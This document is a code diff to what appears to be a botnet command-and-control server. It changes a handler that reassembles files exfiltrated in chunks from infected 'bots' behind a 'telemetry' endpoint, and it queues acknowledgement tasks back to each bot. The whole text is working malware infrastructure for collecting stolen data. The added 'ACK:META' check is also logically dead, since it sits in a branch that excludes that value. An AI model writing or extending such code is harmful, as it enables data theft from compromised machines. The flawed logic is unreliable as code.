@@ -159,7 +159,9 @@ def handle_exfil_chunk(bot_ip, data):
                     "bot_ip": bot_ip
                 }
                 print(f"[EXFIL] Transfer started: {filepath} ({total_chunks} chunks)")
-        except:
+                return "ACK:META"
+        except Exception as e:
+            print(f"[EXFIL] Error parsing META: {e}")
             pass
         return "META"
 
@@ -310,7 +312,8 @@ def telemetry():
                 exfil_result = handle_exfil_chunk(bot_ip, decoded_blob)
 
             if exfil_result in ("IGNORED", "META", "DONE"):
-                pass
+                if exfil_result == "ACK:META":
+                    task_queue.setdefault(bot_ip, []).append({"atom_id": 5, "payload": "ACK:-1"})
             elif exfil_result.startswith("ACK:"):
                 task_queue.setdefault(bot_ip, []).append({"atom_id": 5, "payload": exfil_result})
                 log_event(f"{M}EXFIL ACK{X} queued for {bot_ip}: seq {exfil_result.split(':')[1]}")
